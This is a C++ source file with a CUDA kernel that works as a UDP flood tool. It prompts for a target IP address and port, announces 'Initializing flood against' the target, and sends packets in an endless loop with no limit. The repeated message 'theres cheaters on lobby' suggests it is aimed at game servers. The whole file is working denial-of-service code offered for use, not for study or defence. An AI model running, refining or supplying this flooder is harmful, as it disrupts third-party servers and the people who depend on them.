#include <iostream>
#include <winsock2.h>

using namespace std;

#pragma comment(lib,"ws2_32.lib")
#pragma warning(disable:4996)

#define SERVER "127.0.0.1"
#define BUFLEN 512  
#define PORT 8080  

char ip_address[16] = "";
int port = NULL;

__global__ void computeData(char* data, int length) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    if (idx < length) {
        // For example, convert all lowercase letters to uppercase
        if (data[idx] >= 'a' && data[idx] <= 'z') {
            data[idx] -= 32;
        }
    }
}

class UDPClient {
public:
    UDPClient() {
        if (WSAStartup(MAKEWORD(2, 2), &ws) != 0) {
            cout << "Failed. Error Code: " << WSAGetLastError() << "\n";
            exit(EXIT_FAILURE);
        }
        cout << "Initialized.\n";

        if ((client_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR) {
            cout << "socket() failed with error code: " << WSAGetLastError() << "\n";
            exit(EXIT_FAILURE);
        }

        memset((char*)&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        server.sin_addr.S_un.S_addr = inet_addr(ip_address);
    }

    ~UDPClient() {
        closesocket(client_socket);
        WSACleanup();
    }

    void start() {
        char message[] = "theres cheaters on lobby ;(!";
        int length = strlen(message);
        char* d_message;

        // Allocate memory on GPU and copy message to GPU
        cudaMalloc((void**)&d_message, length * sizeof(char));
        cudaMemcpy(d_message, message, length * sizeof(char), cudaMemcpyHostToDevice);

        int threadsPerBlock = 256;
        int blocksPerGrid = (length + threadsPerBlock - 1) / threadsPerBlock;

        int i = 0;
        while (true) {
            // Launch CUDA kernel to process data
            computeData << <blocksPerGrid, threadsPerBlock >> > (d_message, length);

            // Copy the processed data back to CPU
            cudaMemcpy(message, d_message, length * sizeof(char), cudaMemcpyDeviceToHost);

            // Send the processed message
            if (sendto(client_socket, message, strlen(message), 0, (sockaddr*)&server, sizeof(sockaddr_in)) == SOCKET_ERROR) {
                cout << "sendto() failed with error code: " << WSAGetLastError() << "\n";
                exit(EXIT_FAILURE);
            }

            char answer[BUFLEN] = {};
            int slen = sizeof(sockaddr_in);
            ++i;

            if (i > 10000000) {
                cout << i << endl;
            }
        }

        // Free GPU memory
        cudaFree(d_message);
    }

private:
    WSADATA ws;
    SOCKET client_socket;
    sockaddr_in server;
};

int main() {
    cout << "ip address (ex: 000.00.00.00):";
    cin >> ip_address;
    cout << endl;
    cout << "port:";
    cin >> port;
    cout << endl;

    cout << "Initializing flood against " << ip_address << ":" << port << endl;

    MoveWindow(GetConsoleWindow(), 50, 50, 500, 500, true);

    UDPClient udpClient;
    udpClient.start();
}
